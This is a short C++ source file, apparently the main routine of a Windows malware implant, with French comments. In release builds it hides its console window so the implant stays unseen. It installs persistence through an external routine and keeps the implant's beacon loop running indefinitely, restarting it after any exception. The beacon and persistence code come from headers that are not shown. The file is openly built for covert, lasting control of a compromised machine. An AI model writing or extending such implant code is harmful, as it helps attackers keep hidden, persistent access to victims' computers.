#include "beacon.h"
#include "error.h"
#include "persistence.h"
#include <chrono>
#include <exception>
#include <iostream>
#include <thread>
#include <windows.h>

int main() {
	// Build Debug (NDEBUG absent) : la console reste visible, ce qui permet de
	// suivre les erreurs dans Visual Studio (F5) ou en ligne de commande.
	// Build Release : aucune fenetre, l'implant doit rester discret.
#ifdef NDEBUG
	ShowWindow(GetConsoleWindow(), SW_HIDE);
#endif

	if (install_persistence()) {
		std::cout << "Persistance installee avec succes." << std::endl;
	}
	else {
		std::cout << "Echec de l'installation de la persistance." << std::endl;
	}

	// Une exception ne doit jamais tuer l'implant : on la trace et on relance
	// la boucle apres une courte pause.
	for (;;) {
		try {
			start_implant();
		}
		catch (const std::exception& error) {
			std::cerr << "exception: " << error.what() << std::endl;
		}
		catch (...) {
			std::cerr << "exception inconnue" << std::endl;
		}

		std::this_thread::sleep_for(std::chrono::seconds(5));
	}
}
